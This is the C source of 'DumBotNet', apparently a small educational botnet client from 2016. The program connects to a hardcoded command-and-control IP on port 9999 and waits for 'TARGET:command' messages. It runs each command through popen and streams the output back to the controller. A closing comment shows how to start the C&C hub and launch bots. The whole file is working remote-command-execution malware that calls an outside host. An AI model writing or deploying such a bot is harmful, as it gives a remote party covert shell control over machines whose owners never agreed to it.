/*
 * This file is part of DumBotNet.
 * Copyright (c) David Martinez Oliveira 2016
 *
 * DumBotNet is free software: you can redistribute
 * it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3
 * of the License, or (at your option) any later version.
 *
 * DumBotNet is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with DumBotNet.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define CC_SERVER "159.203.130.71"
#define CC_PORT 9999
#define MAX_BUF 1024

#define PEXIT(str) {perror (str);exit(1);}
static char *bot_id = NULL;

int
bot_print (int s, char *str)
{
  return write (s, str, strlen(str));
}

int
bot_read (int s, char *msg)
{
  memset (msg, 0, MAX_BUF);
  if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");

  return 0;
}

int
bot_run_cmd (int s, char *cmd)
{
  char  line[1024];
  FILE *f = popen (cmd,"r");

  if (!f) return -1;
  while (!feof (f))
    {
      if (!fgets (line, 1024, f)) break;
      bot_print (s, bot_id);
      bot_print (s, ":");
      bot_print (s, line);
    }
  fclose(f);

  return 0;
}

int
bot_parse (int s, char *msg)
{
  char *target = msg;
  char *cmd = NULL;

  if ((cmd = strchr (msg, ':')) == NULL)
    {
      printf ("!! Malformed command. Should be TARGET:command\n");
      return -1;
    }

  *cmd = 0;
  cmd++;
  cmd[strlen(cmd) - 1] = 0;

  if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
    return 0; // Silently ignore messages not for us

  printf ("+ Executing command: '%s'\n", cmd);
  bot_run_cmd (s, cmd);

  return 0;
}


int
bot_connect_cc (char *ip, int port)
{
  char                 msg[1024];
  struct sockaddr_in   server;
  int                  s;
  
  server.sin_addr.s_addr = inet_addr(ip);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);

  if ((s = socket (PF_INET, SOCK_STREAM, 0)) < 0) 
    PEXIT ("socket:");
  if ((connect (s, (struct sockaddr*) &server, sizeof(server))) < 0) 
    PEXIT ("conect:");
  snprintf (msg, 1024, "%s: This is '%s' Up and Running\n", bot_id, bot_id);
  bot_print (s, msg);

  return s;
}

int
main (int argc, char* argv[])
{
  char  msg[MAX_BUF]; 
  int   cc_s;

  if (argc !=2) PEXIT ("Invalid Number Of Arguments:");
  bot_id = strdup (argv[1]);
 
  printf ("'%s' joining the DumbBotNet\n", bot_id);
  cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
  while (1)
    {
      bot_read (cc_s, msg);
      bot_parse (cc_s, msg);
    }
}

// C&C : nk -hub -s T,9999
// Bots: ./bot BotName
